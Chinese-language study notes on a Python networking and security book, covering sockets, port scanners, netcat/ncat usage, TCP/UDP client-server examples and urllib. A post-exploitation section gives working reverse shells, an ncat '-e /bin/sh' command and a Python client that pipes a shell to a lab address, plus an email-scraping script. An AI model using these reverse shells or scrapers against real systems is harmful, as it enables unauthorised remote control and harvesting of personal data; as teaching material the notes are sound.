### 檢查socket裡頭的方法與屬性
每當用上一個新模塊時，好習慣就是檢查裡頭的方法與屬性。
```pythno
>>> import socket
>>> dir(socket)

['__builtins__', '__cached__', '__doc__', '__file__',
'__loader__', '__name__', '__package__', '__spec__', '_
blocking_errnos', '_intenum_converter', '_realsocket', '_
socket', 'close', 'create_connection', 'create_server',
'dup', 'errno', 'error', 'fromfd', 'gaierror', 'getaddrinfo',
'getdefaulttimeout', 'getfqdn', 'gethostbyaddr',
'gethostbyname', 'gethostbyname_ex', 'gethostname',
'getnameinfo', 'getprotobyname', 'getservbyname',
'getservbyport', 'has_dualstack_ipv6', 'has_ipv6', 'herror',
'htonl', 'htons', 'if_indextoname', 'if_nameindex', 'if_
nametoindex', 'inet_aton', 'inet_ntoa', 'inet_ntop',
'inet_pton', 'io', 'ntohl', 'ntohs', 'os', 'selectors',
'setdefaulttimeout', 'sethostname', 'socket', 'socketpair',
'sys', 'timeout']
```
簡單的建立一個socket(上面講過了)
```python
socket.socket(socket.AF_INET,socket.SOCK_STREAM)
```

### 通用socket方法

以下我們來介紹socket的幾個關鍵功能函數(方法)    

socket.recv(buflen):   
從socket接收資料，參數表示一次接收的資料為多少byte。  

socket.recvfrom(buflen):  
接收資料與寄送內容者的ip位址。  

socket.recv_into(buffer):  
將資料接收到特定的緩衝區。  

socket.send(bytes):  
寄送一串bytes，bytes裡頭裝的是byte list，如果要傳送字串，要先將字串轉成bytes串。使用之前要先connect到特定ip。  

socket.sendto(data, address):  
直接將數據送到特定ip。  

socket.sendall(data):  
將緩衝區中所有數據一次送出。  

socket.close():  
關閉連線。  

我們可以用下列方法來查看教學文檔:  
```python
help(socket)
```
### server端 常用 socket方法
server端通常要有個固定ip與port等待client連上來。  
然後對client進行回應。  

socket.bind(address):  
使我們預備連接到參數輸入的ip位址與port(是個tuple)。在建立連線前server端要先打開。  

socket.listen(count):  
限制一次最大的client連線數量。  

socket.accept():  
正式同意client端的連接。該方法會return一個tuple，並且帶著兩個值 client\_socket 與client\_address，使用前一定要呼socket.bind() 與socket.listen()。

(p.99)
### client 常用 socket方法
client端的架構大致是，數個ip不一定的client端，連到單一的一個特定ip的server端。  

socket.connect(ip\_address):  
連接到某個server的ip。  

socket.connect\_ext(ip_address):  
連接到某個server的ip，如果無法連線成功時回傳錯誤報告。  

socket.connect\_ext(ip_address)這個函數非常適合作為port掃描，用來檢查哪些port開啟。  
下列這個例子就是掃描127.0.0.1這個本機自身的port是否開啟。  
```python
#!/usr/bin/python

import socket

ip ='127.0.0.1'
portlist = [21,22,23,80]
for port in portlist:
	sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	result = sock.connect_ex((ip,port))
	print(port,":", result)
	sock.close()
```
結果
```
root@fa44313619cd:/client/lab/chapter3# python3 socket_ports_open.py 
21 : 111
22 : 111
23 : 111
80 : 111
```
錯誤代碼111代表拒絕連線。  
所以我們的上述幾個port是沒有開啟的。  
### 一個簡單的client端

我們現在來展示，在網頁傳輸的底層，我們是如何收發訊號的。

對了，一般而言TCP用的方法有 send()與recv()，而UDP用的方法為sendto()與recvfrom()。

下方的例子以socket層級對google發送了一個http請求。  
```python
#!/usr/bin/python

import socket

print('creating socket ...')
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print('socket created')
print("connection with remote host")

target_host = "www.google.com" 
target_port = 80

s.connect((target_host,target_port))
print('connection ok')

request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % target_host
s.send(request.encode())

data=s.recv(4096)
print("Data",str(bytes(data)))
print("Length",len(data))

print('closing the socket')
s.close()
```
我們可以簡單把建立連線分為四個步驟:  

1. 建立socket物件  
    ```python
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ```

2. 連接特定的主機與port  
    ```python
    s.connect((target_host,target_port))
    ```

3. 發送
    ```python
    s.send(request.encode())
    ```

4. 接收
    ```python
    data=s.recv(4096)
    ```
### 實做http伺服器
接著我們要實做一個socket基礎的http網頁伺服器。  
我們將會使用bind()方法，來接受來自其他ip與port的http請求。  

值得注意的一點是，如果bind('0.0.0.0',8080)或bind(本機ip,8080)就可以接收來自任何ip的傳輸請求。  
但是bind('127.0.0.1',8080)只能接受來自本機的傳輸請求。  
而bind到不是本機可以用的ip時，則會發生錯誤。  
bind到80port這種重要的port需要root權限才能執行。  

如果在下列的例子中加上一行listen(5)，則可以限制一次能與server進行通訊的client最多只能有5個。  
```python
mysocket.listen(5)
```

以下為伺服器範例:  
該伺服器只能接收本機發出的http請求。  
```python
import socket

mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mySocket.bind(('localhost', 8080))

mySocket.listen(5)

while True:
    print('Waiting for connections')
    (recvSocket, address) = mySocket.accept()
    print('HTTP request received:')
    print(recvSocket.recv(1024))
    recvSocket.send(bytes("HTTP/1.1 200 OK\r\n\r\n <html><body><h1>Hello World!</h1></body></html> \r\n",'utf-8'))
    recvSocket.close()
```
我們這就修改一下，讓伺服器能接受來自其他ip的請求。  
```python
import socket

mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mySocket.bind(('0.0.0.0', 8080))

mySocket.listen(5)

while True:
    print('Waiting for connections')
    (recvSocket, address) = mySocket.accept()
    print('HTTP request received:')
    print(recvSocket.recv(1024))
    recvSocket.send(bytes("HTTP/1.1 200 OK\r\n\r\n <html><body><h1>Hello World!</h1></body></html> \r\n",'utf-8'))
    recvSocket.close()
```
accept()來接收每一次的請求，recv(1024)來接收請求的內容。  
send()來寄送回應請求到特定ip，但記得http請求一定要用bytes()函數轉成bytes型態。  

(p.102)

我們用以下代碼測試本上的伺服器:  
```python
import socket
webhost = '127.0.0.1'
webport = 8080
print("Contacting %s on port %d ..." % (webhost, webport))
webclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
webclient.connect((webhost, webport))
webclient.send(bytes("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n".encode('utf-8')))
reply = webclient.recv(4096)
print("Response from %s:" % webhost)
print(reply.decode())
```
假設我們的server的位置在172.17.0.2，  
我們測試是伺服器時以下列代碼進行測試:  
```python
import socket
webhost = '172.17.0.2'
webport = 8080
print("Contacting %s on port %d ..." % (webhost, webport))
webclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
webclient.connect((webhost, webport))
webclient.send(bytes("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n".encode('utf-8')))
reply = webclient.recv(4096)
print("Response from %s:" % webhost)
print(reply.decode())
```
我們來看看測試的client端接收到什麼？  
```
Contacting 172.17.0.2 on port 8080 ...
Response from 172.17.0.2:
HTTP/1.1 200 OK

 <html><body><h1>Hello World!</h1></body></html> 

```
我們見到傳來了html文本，寫著Hello World!，還有自製的200正確接收回應。  

### 實做reverse shell

post-exploitation: 攻擊方與伺服器建立會話後的入侵行為。  

如果今天在進行post-exploitation的測試階段，我們是必要設想如果伺服器已經被植入了某種可以遠端由駭客輸入指令，進而操縱伺服器的腳本。  

為了進行這種假設，我們必須自己寫一個腳本來了解伺服器被滲透後帶來的風險與影響。  

但考慮到，如果你在server上開了6060 port進行通訊，但是防火牆並不允許外頭網內部的6060 port傳送訊息，這時候就必須主動從防火牆內部的伺服器去連線駭客的某個port來接收主機要執行的指令。  

以上這種行為就是reverse shell。  

(p103)

### ncat工具
<span id="ncat"></span>
ncat工具是用來進行網路傳輸(甚至拿來聊天)，測試socket，與滲透測試的工具。  
是由netcat這個古老的網路工具發展而成。  
nmap團隊將netcat進行重寫，成了ncat。  
但由於兩個功能上略有不同，而且大小都很小，所以建議兩個都裝。  
<div style="color:red"">網路上有許多版本的netcat雖然都下載的了，但為了防止不正當用途，所以會少一些功能</div>  

以下是ncat的文檔頁。  
https://nmap.org/ncat/guide/index.html

#### netcat與ncat的簡單指令
ncat 指令 目標的IP位址 目標的port

---

-v: 詳細模式，推薦使用，因為如果不用，你很難知道連接是否順利，而連接失敗的原因為何，連線細節...等。  

---

-u: UDP模式，有這個選項是因為預設是TCP。  

---

-z: Port掃描，如果要掃描127.0.0.1是否打開了80port，命令為"ncat -vz 127.0.0.1 80"。但在ncat中不能像netcat大量掃描。netcat需要大量掃描port時可以這樣，"netcat -vz 127.0.0.1 20-80"掃描20-80 port。  

---

-l: 小寫的L，可以進入監聽模式，要聊天為例子，你可以開放8088 port來聊天，像是這樣，"ncat -lv 8088"，你朋友就可以輸入"ncat -v 你的IP"跟你聊天。  

---

-p: 清楚的表明接下來要輸入port。  

---

-n: 所有指令都可以加入這個，可以避開DNS查詢，這代表你不能輸入網址，但是直接輸入IP時，速度會快上多。  

---
printf輸入HTTP標頭: 
```
printf "GET/HTTP/1.0\r\n"|netcat www.google.com 80 
```
或是
```
echo -ne "GET / HTTP/1.0\r\n\r\n" | nc www.google.com 80
```
---

傳送檔案: 當想要用netcat傳送檔案時，要先開啟接收端，監聽並且等待傳送端的傳輸。  
例如:如果我們要從6000port接收一個叫test的檔案，我們要輸入下列指令等待接收:
```
netcat -lv 6000  >  test
```
然後由傳送端進行傳送:
```
netcat  -v 接收端的IP 6000 < test
```

---

發送與接收UDP

由於UDP沒有三向交握這麼穩定的連線，所以我們最好設置等待時間，一旦超過時間就會放棄。

開啟6000 port的 UDP監聽
```
nc -luv 6000
```

藉由udp傳送訊息，-w1等待一秒，-u為UDP傳輸。
```
echo -n "Hi"|nc -vu -w1 172.17.0.3 6000
```

---
網頁伺服器
```
while true; do nc -l 8000 < index.html; done
```
---

### ncat執行reverse shell
#### 攻擊端
攻擊端先對8088port進行監聽，等待被客戶端上頭的腳本啟動
假設攻擊端IP位址為172.17.0.3
```
ncat -lv 8088
```
#### 客戶端
客戶端電腦被偷偷放入某個程式，然後啟動了ncat
```
ncat -v -e "/bin/sh"  172.17.0.3 8088 
```
---
接下來攻擊端就能掌控客戶端的電腦了  

<div style="color:red"">
雖然<br>
ncat -v -e "/bin/bash -i"  172.17.0.3 8088 <br>
可能也可以，但是經過實測，更常出現錯誤與非必要的CPU佔用。<br>
強烈建議用/bin/sh  
</div>

### python製作的reverse shell客戶端

這是源於參考書本頁碼P80的範例  
在大概讀完了code之後，我們接著來進行分析。  
這次的分析其實可以促進我們對於Unix,Linux等支持POSIX的系統有更深入的理解  
```python
import socket
import subprocess
import os

#設定連線為TCP
socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#測試建立子程序是否失敗
try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')
        
#建立TCP socket連線
socket_handler.connect(("172.17.0.3", 45679))

#將socket連接到系統的標準輸入輸出，會在後續進行解釋。
os.dup2(socket_handler.fileno(),0)
os.dup2(socket_handler.fileno(),1)
os.dup2(socket_handler.fileno(),2)

#啟動shell
shell_remote = subprocess.call(["/bin/sh"])

```
首先是設定TCP連線
```python
socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
實際進行連線
```python
socket_handler.connect(("172.17.0.3", 45679))
```
接下來這個地方比較需要更多的知識  
我們要先知道，在linux中所有的東西都被視為某種檔案  
而每個檔案都有一個檔案描述符(File descriptor)，基本上是個整數編號  
檔案描述符其中一個功能是紀錄每個Process打開了哪些檔案。  

而在此處有三個一定要記得的檔案描述符:  
```
1.標準輸入
    POSIX名稱:                STDIN_FILENO
    描述符(File descriptor)   0
    C的<stdio.h>的名稱        stdin

2.標準輸出
    POSIX名稱:                STDOUT_FILENO
    描述符(File descriptor)   1
    C的<stdio.h>的名稱        stdout

3.標準錯誤
    POSIX名稱:                STDERR_FILENO
    描述符(File descriptor)   2
    C的<stdio.h>的名稱        stderr
```
既然任何東西都是檔案，而每個檔案都有個描述符，  
那我們的socket也不例外，我們用以下的方法取得socket的描述符。下列的方法會回傳一個整數，那個整數就是我們socket的描述符了。  
```python
socket_handler.fileno()
```
接下來我們看以下的方法，

```python
os.dup2(描述符1,描述符2)
```
將檔案描述符1複製到描述符2。  
這聽起來有點抽象，但是實際操作起來的意義就是:  
所有目前這個python檔案執行時的顯示內容,輸入,錯誤報告  
都會直接傳入socket。  

所以用最白話的方式說，就是我們之後執行了/bin/sh，而攻擊者輸入到socket的內容會傳來這台電腦上，而這台電腦原本要印在螢幕上的stdout也會傳入socket傳到攻擊者的電腦。  

## IP domain,addresses與管理錯誤 
<span id="ipdomain"></span>
(p.105)  
socket裡頭有幾個不同的方法，可以方便的取得網址轉IP或相反的功能。這些功能會去查詢目前ISP(網路供應商)提供的DNS伺服器並且回傳結果。  

#### 取得當前的的網址
```python
gethostname() 
```

#### 以IP取得網址  
```python
socket.gethostbyaddr(address):
```

#### 以網址取得單個IP  
以IPv4形式回傳
```python
socket.gethostbyname(hostname)
```

#### 以網址取得多個IP  
有時候一個網站不只一個IP，  
如果一個網站有多個IP時可以用下列函數  
會回傳一個tuple，而tuple裡頭包著一個list儲存著這個網址後的所有IP。  
```
socket.gethostbyname_ex(name):
```

#### 協定名稱取得該協定常用的port
如果輸入
```python
socket.getservbyname('http') 
```
結果會return 80，因為http主要在用80port。

#### 常用的port取得協定名稱
```python
 socket.getservbyport(80)
```
會回傳http

#### 得到更多訊息與IPv6
```python
socket.getaddrinfo("www.google.com",None,0,socket.SOCK_STREAM)
```
得到的訊息  
```
getaddrinfo [(<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('172.217.27.132', 0)), (<AddressFamily.AF_INET6: 10>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('2404:6800:4012:1::2004', 0, 0, 0))]
```
### 處理socket的錯誤
我們在建立遠端連線時，一定要考慮到伺服器重啟動，或者是伺服器錯誤或關機的情況發生。  
在python的socket模塊裡頭有幾種不同的錯誤。  
  
---
這種錯誤通常是過長的等待時間。  
```
exception socket.timeout
```
---
當搜索某個IP的資訊出錯時，會跳出這個錯誤。  
```
exception socket.gaierror
```
---
通用錯誤，在這個錯誤區塊，你可以處理任何的socket錯誤類型。  
```
exception socket.error
```
---
錯誤捕獲範例:
```python
import socket,sys

host =input('input domain or address\n')
port = int(input('input port\n'))


try:
    mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(mysocket)
    mysocket.settimeout(5)
except socket.error as e:
	print("socket create error: %s" %e)
	sys.exit(1)
	

try:
    mysocket.connect((host,port))
    print(mysocket)

except socket.timeout as e :
	print("Timeout %s" %e)
	sys.exit(1)
except socket.gaierror as e:
	print("socket.gaierror mean ip find fail %s" %e)
	sys.exit(1)
except socket.error as e:
	print("Connection error: %s" %e)
	sys.exit(1)

```
如果輸入不存在的網址時會觸發socket.gaierror  


## port開放性掃描
<span id="portscan"></span>
(p.111)  
我們確實可以用Nmap一類的工具掃描port，而在此處我們要用socket來實做效果類似的功能。  
進而確認開放的port。  

我們在最簡單的情況下可以藉由以下函數來檢查port的開放性。  
```python
connect_ex()
```

### 簡單的port掃描器

以下為port scan範例，在以下的範例中我們用sys.exit()，再出錯之後將控制全交還給直譯器。  
這個port scan 掃描了我們自己的開放port。  
connect_ex()如果回傳0代表port開放，回傳1代表port關閉。  
connect_ex()的第一個參數可以輸入IP或者是網址，因為該函數自帶DNS解析。  
sock.settimeout(5)設置了五秒的等候時間，如果超過五秒，則是為連線失敗。  
```python
#!/bin/python3

import socket
import sys

def checkPortsSocket(ip,portlist):
    try:
        for port in portlist:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip,port))
            if result == 0:
                print ("Port {}: \t 開啟".format(port))
            else:
                print ("Port {}: \t 關閉".format(port))
            sock.close()
    except socket.error as error:
        print (str(error))
        print ("網址可能不存在")
        sys.exit()

checkPortsSocket(input("請輸入IP或網址\n"),[21,22,80,8080,443])
```

### 稍微完整的port掃描器
(p.113)
這個範例讓使用者輸入IP位址，與要掃描的port的範圍。  
```python
import socket
import sys
from datetime import datetime
import errno

remoteServer    = input("Enter a remote host to scan: ")
remoteServerIP  = socket.gethostbyname(remoteServer)

print("Please enter the range of ports you would like to scan on the machine")
startPort    = input("Enter a start port: ")
endPort    = input("Enter a end port: ")

print("Please wait, scanning remote host", remoteServerIP)

time_init = datetime.now()

try:
	for port in range(int(startPort),int(endPort)):
		print ("Checking port {} ...".format(port))
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(5)
		result = sock.connect_ex((remoteServerIP, port))
		if result == 0:
			print("Port {}: 	 Open".format(port))
		else:
			print("Port {}: 	 Closed".format(port))
			print("Reason:",errno.errorcode[result])
		sock.close()

except KeyboardInterrupt:
	print("You pressed Ctrl+C")
	sys.exit()
except socket.gaierror:
	print('網址不存在，或沒有DNS知道該網址')
	sys.exit()
except socket.error:
	print("無法連線到伺服器")
	sys.exit()

time_finish = datetime.now()
total =  time_finish - time_init
print('Port Scanning Completed in: ', total)
```

### 進階port掃描器
(p.115)
<span id="socketclientserver"></span>
```python
import optparse
from socket import *
from threading import *

#這個函數會掃描單一個port
def socketScan(host, port):
	try:
		socket_connect = socket(AF_INET, SOCK_STREAM) #設定連線
		socket_connect.settimeout(5) #設定延遲
		result = socket_connect.connect((host, port)) #連線並且取得結果
		print('[+] %d/tcp open' % port)
	except Exception as exception:#如果連線失敗
		print('[-] %d/tcp closed' % port) #回報關閉的port
		print('[-] Reason:%s' % str(exception)) #回報失敗原因
	finally:
		socket_connect.close()	

#這個函數會生成多個Thread，並且同時觸發上面掃描單一port的函數。  
#此處不用擔憂GIL鎖造成的影響，因為主要的時間延遲在於網路傳輸，  
#所以幾乎可以達到一定的平行發出連線請求的效果。  
def portScanning(host, ports):
	try:
		ip = gethostbyname(host) #如果是網址，取得IP
		print('[+] Scan Results for: ' + ip)
	except:
		print("[-] Cannot resolve '%s': Unknown host" %host)
		return

	for port in ports:
		t = Thread(target=socketScan,args=(ip,int(port))) #每個要搜尋的port產生一個執行緒
		t.start()

def main():
	parser = optparse.OptionParser('socket_portScan '+ '-H <Host> -P <Port>')
	parser.add_option('-H', dest='host', type='string', help='specify host')
	parser.add_option('-P', dest='port', type='string', help='specify port[s] separated by comma')

	(options, args) = parser.parse_args() #取得使用者輸入參數

	host = options.host #取得IP參數
	ports = str(options.port).split(',') #將port參數用逗號切割開來

	if (host == None) | (ports[0] == None): #如果使用者沒輸入或輸入錯誤，跳出參數說明
		print(parser.usage)
		exit(0)

	portScanning(host, ports)


if __name__ == '__main__':
	main()

```

## 實做簡單的TCP客戶端與伺服器
(p.117)
在這個章節將會實做應用程式層級的TCP伺服器端與客戶端。  
這次會將見socket分解成幾個步驟來說明:  

### 設定IPv4與TCP
```python
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
### 綁定port
這時候我們要考慮到port 1-1024包含著標準協定，所以要盡量避開。  
```python
server.bind(("localhost", 9999))
```

### 設定一次最多幾個client可以連接
```python
server.listen(10)
```

### 等待client連入
這個方法會等待客戶端連入，並且回傳客戶端的IP與port。  
```python
 (host, port) = server.accept()
```

### 與客戶端通信
我們用recv()與send()兩個方法與客戶端進行資料收發。  
(在UDP中用recvfrom()與sendfrom())  
recv()裡頭的參數限定了我們一次能接收的bytes數量，    
send()的參數則是決定會回傳什麼訊息給客戶端。  
```python
received_data = socket_client.recv(1024)
print("Received data: ", received_data)
socket_client.send(received)
```

### 關於客戶端
客戶端連接server時用connect()方法，並在其中輸入IP與Port。  
並且用send()來傳送資料給server端。  
```python
socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_cliente.connect(("localhost", 9999))
socket_cliente.send("message")
```

### 完整的TCP server範例

```python
import socket
import threading

# 伺服器位址與port，也可以用0.0.0.0代表所有IPv4來源
SERVER_IP   = "172.17.0.2"
SERVER_PORT = 9998

# family = Internet, type = stream socket means TCP
# 設置IPv4與TCP
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 綁定IP,port
server.bind((SERVER_IP,SERVER_PORT))

# 最大連線數量5
server.listen(5)

print("[*] 伺服器正在監聽 %s:%d" % (SERVER_IP,SERVER_PORT))

#取得client的socket連線實體
client,addr = server.accept()

#回應客戶端訊息
client.send("我是伺服器，我正在接受你的連結...".encode())

#顯示客戶端的IP與Port
print("[*]從 %s:%d接受連結" % (addr[0],addr[1]))

#處理客戶端接收與回應的函數
def handle_client(client_socket):
    request = client_socket.recv(1024)#一次最大接收1024bytes的內容
    print("從IP位址為%s的客戶端收到訊息" % str(client_socket.getpeername()))
    print("訊息為:%s \n"%request.decode('utf-8')) #如果要顯示中文建議utf-8解碼
    client_socket.send(bytes("ACK","utf-8")) #告知對方我們成功接收

#持續接收訊息
while True:
    handle_client(client)

#關閉連接
client_socket.close()
server.close()

# 如果一次只接受三個bytes，client端輸入'abc'就會分三次接收
```

### 完整的TCP client範例
客戶端
```python
import socket

host="172.17.0.2"
port = 9998

try:
	mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #設置ipv4與TCP
	mysocket.connect((host, port)) #連線到server端的port
	print('連接到主機 '+str(host)+'  port: '+str(port))
	message = mysocket.recv(1024) #一次最大接收1024個bytes
	print("從伺服器接收的訊息", message.decode('utf-8'))
	while True:
		message = input("輸入你的訊息 > ")
		mysocket.send(bytes(message.encode('utf-8'))) #將訊息轉為utf-8後送出
		if message== "quit": #輸入quit後離開
			break
#錯誤處理
except socket.errno as error:
	print("Socket error ", error)
#最後關閉連線
finally:
	mysocket.close()
```
## 實做簡單的UDP客戶端與伺服器
<span id="udpclientserver"></span>
(p.121)
UDP是非連接導向的連接方式，基本是允須封包損毀的，只要大部分封包到達即可。  
例如影音串流，這種講求快速的通訊方式就非常適合。  

只要簡單的把部份<span style="color:red;">SOCK\_STREAM</span>參數改為<span style="color:red;">SOCK\_DGRAM</span>即可。

### 實做UDP server
```python
import socket,sys

SERVER_IP = "172.17.0.2"
SERVER_PORT = 6789

socket_server=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #設定UDP,ipv4
socket_server.bind((SERVER_IP,SERVER_PORT)) #綁定IP,Port

print("[*] Server UDP 監聽 %s:%d" % (SERVER_IP,SERVER_PORT))

while True:
	print("\n新一輪通信展開")
	data,address = socket_server.recvfrom(4096) #一次接收最大4096 bytes
	socket_server.sendto("我是伺服器，正同意接收...".encode(),address)#接收client端IP
	print("訊息為 %s 接收自 %s: "% (data.decode('utf-8'), address))#接收訊息

	#回應我們的作業系統類別
	try:
		response = "作業系統是: %s" % sys.platform
	except Exception as e:
		response = "%s" % sys.exc_info()[0]
	print("我們的回應:",response)

	#回傳我們的作業系統訊息	
	socket_server.sendto(bytes(response,encoding='utf8'),address)

#關閉連線
socket_server.close()	
```

### 實做UDP client
```python
import socket

SERVER_IP = "172.17.0.2"
SERVER_PORT = 6789

address = (SERVER_IP ,SERVER_PORT)#將IP跟port包入同一個tuple

socket_client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #設定UDP連線

while True:
	message = input("輸入你的訊息 > ")
	if message=="quit":
		break
	socket_client.sendto(bytes(message,encoding='utf8'),address)#發送訊息
	response_server,addr = socket_client.recvfrom(4096)#接收訊息與IP位址
	print("伺服器的回應 => %s" % response_server.decode('utf-8'))
		
socket_client.close()
```

### 延伸閱讀
### SSL socket模塊
附帶加密效果  
https://docs.python.org/3/library/ssl.html

<a href="#menu-location">跳到目錄</a>  

## HTTP程式設計
<span id="httplearn"></span>
(p126)
本章會用上python標準庫中的urllib，到更簡化步驟的requests套件與httpx套件。  
並且解讀http的機制。  

### HTTP簡論
http是個應用層的協定，定義了server,client,proxy的行為。  

由兩個主要部份形成，request與response，client藉由URL取得資料，server將資料傳給client。(p127)  
並且使用cookie與session等非狀態性的紀錄用戶方式。  

http以狀態碼與header來對用戶表示當前的傳輸狀態。  

### HTTP狀態碼
#### 100: 傳遞某種訊息  
#### 200: 成功  
#### 300: 重新導向  
#### 400: 客戶端出錯  
#### 500: 伺服器出錯  
我們在300一類裡面我們可以看到302重新導向的狀態碼，導向別的網站。  
307則導向同一個網站的不同位置。  

### 用http.client模塊建立HTTP客戶端
(p.128)  

http.client模塊與urllib.request模塊有各自不同的功能，但都很適合進行測試。  

細節可以查看官方文檔  
https://docs.python.org/3/library/http.client.html.  

http.client輸入網址與port之後可以產生一個實例，用於跟伺服器進行通訊。  

###  http.client範例
```python
import http.client

#建立連線
connection = http.client.HTTPConnection("www.google.com")
#選擇方法
connection.request("GET", "/")
#取得回應
response = connection.getresponse()

print(type(response)) #為<class 'http.client.HTTPResponse'>
print(response.status, response.reason) #如果通訊正常response.status為200，response.reason為Ok

if response.status == 200:
    data = response.read() #讀取網頁回傳的內容
    print(data)
```
<span id="urllib"></span>
### urllib.request範例
我們要用另外一個模塊urllib.request建立http通訊。  
這個模塊可以用簡單的界面來處理各種網路資源請求，包含SFTP,FTP,HTTP。  

```python
import urllib.request
import urllib.parse

#POST request

data_dictionary = {"id": "0123456789"} #要傳送的資料
data = urllib.parse.urlencode(data_dictionary) #將字典轉成url編碼的Json格式
data = data.encode('utf-8') #轉換成純utf-8字串,ascii也可以

#讀取回應的內容
with urllib.request.urlopen("http://httpbin.org/post", data) as response:
	print(response.read().decode('utf-8')) #這裡也可以用readline,readlines等檔案讀取的方法
```
也可以設置逾時期限  
```python
respones=urlopen("http://www.google.com",timeout=0.1)
```
官方文檔:  
https://docs.python.org/3/library/urllib.request.html#module-urllib.request  

### urllib將收到的資料轉換成JSON物件
這將會回傳一個dictionary，裡頭可以用key,value的方式檢索json內容。  
```python
#!/usr/bin/env python3

import urllib.request
import json

url= "http://httpbin.org/get"

with urllib.request.urlopen(url) as response_json:
    data_json= json.loads(response_json.read().decode("utf-8"))
    print(data_json)
```
(p.132)

### urllib取得header
什麼是http header呢？基本就是在http回應和請求的前頭。包含伺服器與用戶資訊，用戶應該如何解讀伺服器的回應之類的。  

例如在User-Agent項目裡頭說明著你使用的瀏覽器與作業系統。  

以下是取得header的範例  
```python
#!/usr/bin/env python3

import urllib.request
from urllib.request import Request

url="http://python.org"

#偽造的USER_AGENT作業系統是Android
USER_AGENT = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36'

def chrome_user_agent():
    #看看網站回應的response header
    opener = urllib.request.build_opener() #建立opener
    opener.addheaders = [('User-agent', USER_AGENT)] #opener加入寫好的User-agent
    urllib.request.install_opener(opener) #安裝opener到目前的urllib.request實例中
    response = urllib.request.urlopen(url) #打開網址
    print("Response headers")
    print("--------------------")
    for header,value in response.getheaders():
        print(header + ":" + value)

    #查看我們自己的request header
    request = Request(url)
    request.add_header('User-agent', USER_AGENT)
    print("\nRequest headers")
    print("--------------------")
    for header,value in request.header_items():
	    print(header + ":" + value)

if __name__ == '__main__':
    chrome_user_agent()
```
運作之後我們先來看看網站回應的header
```
Response headers
--------------------
Connection:close
Content-Length:50825
Server:nginx
Content-Type:text/html; charset=utf-8
X-Frame-Options:DENY
Via:1.1 vegur, 1.1 varnish, 1.1 varnish
Accept-Ranges:bytes
Date:Thu, 10 Jun 2021 09:03:04 GMT
Age:1730
X-Served-By:cache-bwi5127-BWI, cache-hkg17925-HKG
X-Cache:HIT, HIT
X-Cache-Hits:1, 4334
X-Timer:S1623315784.249147,VS0,VE0
Vary:Cookie
Strict-Transport-Security:max-age=63072000; includeSubDomains
```
然後瞧瞧我們自己的請求header
```
Request headers
--------------------
User-agent:Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
```
我們偽造的是安卓系統上的chrome瀏覽器，opener的屬性addheaders也可以拿來客製化header。  
同樣request.add_header()也能達到同要目標。  

### 用urllib與正規表示法來提取可能是email的字串

```python
import urllib.request
import re

USER_AGENT = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36'

url =  input("Enter url:http://")

#https://www.packtpub.com/about/terms-and-conditions

opener = urllib.request.build_opener()
opener.addheaders = [('User-agent', USER_AGENT)]
urllib.request.install_opener(opener)

response = urllib.request.urlopen('http://'+url)
html_content= response.read()
pattern = re.compile("[-a-zA-Z0-9._]+[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+.[a-zA-Z0-9_.]+")
mails = re.findall(pattern,str(html_content))
print(mails)
```
### 用urllib下載檔案
```python
#!/usr/bin/python

import urllib.request

print("starting download....")

#以兩個不同方法下載檔案

#網址
url="https://www.python.org/static/img/python-logo.png"

#用urlretrieve下載檔案
urllib.request.urlretrieve(url, "python_by_urlretrieve.png")

#用urlopen下載檔案
with urllib.request.urlopen(url) as response: #將取得的內容存入response裡頭
    print("Status:", response.status)
    print( "Downloading python.png")
    with open("python_by_urlopen.png", "wb" ) as image: #二進位寫入模式
        image.write(response.read())
```

### urllib錯誤處理
(p.136)
下方簡單的向一個不存在的網址發出請求。  
來當作捕獲錯誤的案例。  
urllib.error.URLError會回傳網址上的錯誤。  
```python
#!/usr/bin/env python3

import urllib.request
import urllib.error

def count_words_file(url):
    try:
        file_response = urllib.request.urlopen(url)
    except urllib.error.URLError as error:
        print('Exception', error)
        print('reason', error.reason)
    else:
        content = file_response.read()
        return len(content.split())


print(count_words_file('https://www.gutenberg.org/cache/epub/2000/pg2000.txt'))

count_words_file('https://not-exists.txt')
```

<a href="#menu-location">跳到目錄</a>  

<span id="requests"></span>
### 使用requests建立HTTP客戶端
(p.137)
requests套件非常適合用來觸發REST API，如果從便利的角度來看。  
我們可以用pip安裝該套件。  
```
pip3 install requests
```
關於REST API此模塊提供了方法來實現get,post,put,update,delete,head還有選項方法(options method)  
順帶一提，requests包裝了urllib.request在內與其他python模塊。    

最簡單的呈現方式甚至可以如此:
```python
import requests
